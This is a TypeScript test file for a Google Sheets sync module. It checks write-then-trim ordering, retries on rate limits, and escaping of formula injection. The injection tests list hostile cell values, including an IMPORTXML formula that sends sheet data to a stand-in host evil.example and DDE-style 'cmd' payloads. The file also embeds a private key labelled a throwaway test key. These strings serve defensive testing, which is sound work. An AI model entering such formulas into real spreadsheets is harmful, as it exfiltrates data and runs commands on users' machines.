/* Behavioral test for writeSheet's write-then-trim ordering (lib/sheets.ts,
   found 2026-09-17 by code review): the OLD implementation cleared the
   whole tab first and wrote second, so any failure between those two calls
   (a timeout, a transient Google API error, the process dying) left the tab
   completely BLANK until the next sync — for the hourly aggregate sync, up
   to an hour of the Owner opening an empty "Live" or "Students" tab. This
   test proves the new order (write first, trim leftover rows second) never
   produces that outcome: a failed write leaves the OLD data in place, never
   an empty tab, and the trim range starts exactly after the new data. */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const calls: { method: string; url: string; body?: string }[] = [];

function mockFetch(overrides: { failPut?: boolean; failClear?: boolean } = {}) {
  return vi.fn(async (url: string, init?: RequestInit) => {
    const method = init?.method || "GET";
    calls.push({ method, url, body: typeof init?.body === "string" ? init.body : undefined });
    if (url.includes(":batchUpdate")) return new Response("{}", { status: 200 });
    if (method === "PUT") {
      if (overrides.failPut) return new Response("boom", { status: 500 });
      return new Response("{}", { status: 200 });
    }
    if (url.includes(":clear")) {
      if (overrides.failClear) return new Response("boom", { status: 500 });
      return new Response("{}", { status: 200 });
    }
    return new Response("{}", { status: 200 });
  });
}

beforeEach(() => {
  calls.length = 0;
  process.env.GOOGLE_SA_EMAIL = "test@example.iam.gserviceaccount.com";
  process.env.GOOGLE_SA_PRIVATE_KEY = TEST_KEY;
  process.env.GOOGLE_SHEET_ID = "test-sheet-id";
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

// A real (throwaway) RSA key so crypto.createSign(...).sign(key) doesn't throw —
// the token endpoint itself is mocked below, so the signature's actual
// validity is irrelevant, only that signing succeeds.
const TEST_KEY = `-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDm1Minf2JzbHs6
7aubrteKyGuFP8fzma4+MSVtty0GBy1Zm5O1DwNCFT1zP1yUC2dmaCo45CeJlHey
/IUjXK1sGgpDBQIaPUvXal/+299yehADReIb7KcffjQKZ40ngzWM0fRuu3cBRig7
WGbwHpNQ2kGyKXg9nvrYaK6Q8c+ZFIkNSzhVc30mzWQUCtSUsRCiNQoIsXPAq6va
ikYtr4zzs1see7KdxajRTLkNEVS+kf/MYhpEv8z8/nvf8EsZko0OUi0RtqsNwVhg
wWGqaOrVfz+xu+fAaeLS6S0L3VUeCqYzbNhlFQRFdVB6LvjhN2S04tFC720WSuee
g+qsuhGXAgMBAAECggEAIG2uTtG3jA2mdk3jePikMUwcxtiCB7gEYZpX7sT4H0us
1FTl+F7Gj2caffFd2TKM8TcbD2kGIO7prgyJy8D+YBx8apPuiq8n03iPSeeryZJa
Y4tSy6eAhw0c1IVdsDpfsIvichgGDPjFOCkgNQWmnoo7BoOK7+VAylxSgexmxNN4
a/pkXFGqaGWITM4lbW5N2Z/Afpa3wAfI5/qdArRgxrrN0mSWuh/MU0oRa/zUopuU
LX52NmZoqrPRJnxHHEeQvlZmi47Ac61HbiUForMdwubn+YWYwTMOHaxxIjhgVG0W
GVyS32treUFVliwVvoBNWxu3nUaV2uJpw/FsLKpPeQKBgQD0SJZSh1iOhdxhNPVg
OP1/7Hio124UGo7AIcRjnpr7dRGPepZxthKOmGwlETORXmD5VSQM3bGchubxw0Nk
YuL2HOK6KbJpzNUqa9nCj1V3f7ShT4dptvDrYZculj/Mqt18ysmnrglhcutipF/a
NOzh6ogu3PySmABL8YMsPqwHtQKBgQDx5wXpbYKYta+C4D08ph1pLFzdzf5hUv05
lQd6JH5E8dbqVNWt76o/enVJb/Hga3JRNBNhRB1663iOFGfKFjuPGtU32Yy/wQ4g
WSgik0F7kJuv+ORSsd1OSPW2+3tfjenGmvk2VPEHmLW56Mf57Sie48skDYX+WT9w
tQ+k3+4rmwKBgCxDVtGfaqFwie0nLmsACJb8XySg3HZSFZmkxLQUUhrMLKFl4gq6
pgQmhDn3MvPdOQ8UqVKXfQ5St1gJPJXdASj9NOvskEJxdhKYtj11wVPE1RMBmRTD
rEXKSh2L5gWM1FM/X2i9tT9uFk6qYB/mxSFuYLy1GCLr3enk2hLTTFKdAoGBAN5D
HrNz42LczP67eoiXOL7B/DHwa6KQ1gpqXAxmK369lnKIsCy44PyiT9HCAcPp9YeX
CZd9NnkSkho5tYOBGghK504BnckyYQBn6vCZzLj0DZiKX3973ZNohhwyxRDvG7VX
/1NkiHIqZg8DS3rf5UrYknX11v/0kM3GDzG2buexAoGADFTOiK1MoXRVmmroY1Oc
kI/CEQU5o3TeAWr8a6ZDdY8bKzX5gnyesIhKVTCi6jkU615n2bhAvW5MV07s/jom
q7erew+ukmTFafJBe3ctmlM+4RWKe1jeqMkYJZRZgo50MLdOY4cSS6W9StLOz1OY
FVu0/0Ngywo2rPLJjcSuovU=
-----END PRIVATE KEY-----`;

describe("writeSheet write-then-trim ordering", () => {
  it("pads every row to A:Z so an empty/short row overwrites stale cells (a deleted student's row must not survive)", async () => {
    global.fetch = mockFetch() as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    await writeSheet("Test", [["h"], [], ["Total", 0]]);
    const put = calls.find((c) => c.method === "PUT");
    const values = JSON.parse(put!.body!).values as string[][];
    expect(values).toHaveLength(3);
    for (const row of values) expect(row).toHaveLength(26);
    expect(values[1].every((v) => v === "")).toBe(true);
    expect(values[2].slice(0, 2)).toEqual(["Total", 0]);
  });

  it("writes data BEFORE trimming leftover rows — never clears before writing", async () => {
    global.fetch = mockFetch() as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    const r = await writeSheet("Test", [["a", "b"], ["1", "2"]]);
    expect(r.ok).toBe(true);

    const put = calls.find((c) => c.method === "PUT");
    const clear = calls.find((c) => c.url.includes(":clear"));
    expect(put).toBeDefined();
    expect(clear).toBeDefined();
    expect(calls.indexOf(put!)).toBeLessThan(calls.indexOf(clear!));
  });

  it("the trim range starts exactly one row after the data just written", async () => {
    global.fetch = mockFetch() as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    await writeSheet("Test", [["h1", "h2"], ["r1", "r1"], ["r2", "r2"]]); // 3 rows
    const clear = calls.find((c) => c.url.includes(":clear"));
    expect(decodeURIComponent(clear!.url)).toContain("Test!A4:Z1000");
  });

  it("a PUT failure leaves the OLD data untouched — no clear call ever happens", async () => {
    global.fetch = mockFetch({ failPut: true }) as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    const r = await writeSheet("Test", [["a"]]);
    expect(r.ok).toBe(false);
    expect(calls.some((c) => c.url.includes(":clear"))).toBe(false);
  });

  it("a trim failure after a successful write is reported, but the new data is already live", async () => {
    global.fetch = mockFetch({ failClear: true }) as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    const r = await writeSheet("Test", [["a"]]);
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/trim failed/);
    // the PUT still happened and succeeded before the trim failure
    expect(calls.some((c) => c.method === "PUT")).toBe(true);
  });
});


/* Formula injection (found in the Sep 21 QA pass): every Sheet write uses
   USER_ENTERED, so a cell whose text starts with = + - or @ is EXECUTED as a
   formula. A student can type their own name at BVRIT self-registration, and
   complaint text / expense notes are free text - =IMPORTXML("http://evil/?"&A1:F50, ...)
   would read the owner's data and send it out when the Sheet is opened. Every
   text cell is neutralised centrally, in the two functions all writes go through. */
describe("Sheet writes neutralise formula injection", () => {
  const evil = [
    '=IMPORTXML("http://evil.example/?"&A1:F50,"//a")',
    '=HYPERLINK("http://evil.example","click")',
    "+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
  ];
  const putBody = () => JSON.parse(calls.find((c) => c.method === "PUT")!.body!).values as unknown[][];
  const appendBody = () => JSON.parse(calls.find((c) => c.url.includes(":append"))!.body!).values as unknown[][];

  it("writeSheet prefixes dangerous text with an apostrophe (shown as plain text)", async () => {
    global.fetch = mockFetch() as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    await writeSheet("Test", [["Name"], ...evil.map((e) => [e])]);
    const cells = putBody().slice(1).map((r) => r[0]);
    cells.forEach((c, i) => expect(c, evil[i]).toBe("'" + evil[i]));
  });
  it("appendSheet does the same for event-log rows", async () => {
    global.fetch = mockFetch() as unknown as typeof fetch;
    const { appendSheet } = await import("../lib/sheets");
    await appendSheet("Log", evil.map((e) => ["t", e, 5]));
    appendBody().forEach((r, i) => { expect(r[1], evil[i]).toBe("'" + evil[i]); expect(r[2]).toBe(5); });
  });
  it("leaves normal values alone: numbers, negative numbers, text, phone (already prefixed), dashes", async () => {
    global.fetch = mockFetch() as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    await writeSheet("Test", [["a"], [5, -2.5, "-5", "+12", "Regular garment", "'+91 9876543210", "—", "", "2026-09-21 14:51", "#1015"]]);
    expect(putBody()[1].slice(0, 10)).toEqual([5, -2.5, "-5", "+12", "Regular garment", "'+91 9876543210", "—", "", "2026-09-21 14:51", "#1015"]);
  });
});

/* Google allows about 60 write requests per minute per user. The hourly sync now
   writes ~20 tabs (three calls each once the tabs are split per college), so a
   429 "too many requests" is a realistic answer, and without a retry it left the
   rest of the tabs stale for an hour with nothing to say so. Writes retry with
   backoff on 429/503 (and honour Retry-After), then give up cleanly. */
describe("Sheet writes retry when Google says slow down", () => {
  const withThrottle = (path: "put" | "clear" | "append", times: number, status = 429) => {
    let left = times;
    return vi.fn(async (url: string, init?: RequestInit) => {
      const method = init?.method || "GET";
      calls.push({ method, url, body: typeof init?.body === "string" ? init.body : undefined });
      const hit = (path === "put" && method === "PUT") || (path === "clear" && url.includes(":clear")) || (path === "append" && url.includes(":append"));
      if (hit && left > 0) { left--; return new Response("slow down", { status, headers: { "retry-after": "0" } }); }
      return new Response("{}", { status: 200 });
    });
  };
  beforeEach(() => { process.env.SHEETS_RETRY_BASE_MS = "1"; });

  it("writeSheet: a 429 on the data write is retried and then succeeds", async () => {
    global.fetch = withThrottle("put", 2) as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    const r = await writeSheet("Test", [["a"], ["b"]]);
    expect(r.ok).toBe(true);
    expect(calls.filter((c) => c.method === "PUT")).toHaveLength(3); // 2 throttled + 1 good
  });
  it("writeSheet: a 429 on the trim is retried too", async () => {
    global.fetch = withThrottle("clear", 1) as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    expect((await writeSheet("Test", [["a"]])).ok).toBe(true);
  });
  it("appendSheet: a 503 is retried and then succeeds", async () => {
    global.fetch = withThrottle("append", 1, 503) as unknown as typeof fetch;
    const { appendSheet } = await import("../lib/sheets");
    expect((await appendSheet("Log", [["t", "x"]])).ok).toBe(true);
    expect(calls.filter((c) => c.url.includes(":append"))).toHaveLength(2);
  });
  it("gives up after a few tries and reports the failure instead of hanging", async () => {
    global.fetch = withThrottle("put", 99) as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    const r = await writeSheet("Test", [["a"]]);
    expect(r.ok).toBe(false);
    expect(calls.filter((c) => c.method === "PUT").length).toBeLessThanOrEqual(4);
  });
  it("does not retry a real error (a 400 fails immediately)", async () => {
    global.fetch = withThrottle("put", 99, 400) as unknown as typeof fetch;
    const { writeSheet } = await import("../lib/sheets");
    expect((await writeSheet("Test", [["a"]])).ok).toBe(false);
    expect(calls.filter((c) => c.method === "PUT")).toHaveLength(1);
  });
});
